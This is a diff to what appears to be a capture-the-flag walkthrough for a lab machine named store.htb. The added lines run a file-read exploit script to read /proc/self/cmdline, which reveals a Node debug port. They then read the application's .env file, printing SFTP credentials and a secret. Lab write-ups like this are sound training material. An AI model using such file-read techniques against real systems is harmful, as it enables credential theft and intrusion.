@@ -281,5 +281,18 @@ I now have full file read!
 I can check `/proc/self/cmdline` to find the exact command that was used to run the process
 
 ```python
+python3 store_file_read.py store.htb /proc/self/cmdline            
+node--inspect=127.0.0.1:9229/home/dev/projects/store1/start.js
+```
 
+As seen here its running as the `dev` user
+
+And more importantly this is giving us the directory this is running from!
+
+```python
+python3 store_file_read.py store.htb /home/dev/projects/store1/.env
+SFTP_URL=sftp://sftpuser:WidK52pWBtWQdcVC@localhost
+SECRET=Hm9zeWC38
+STORE_HOME=/home/dev/projects/store1
+PORT=5000
 ```
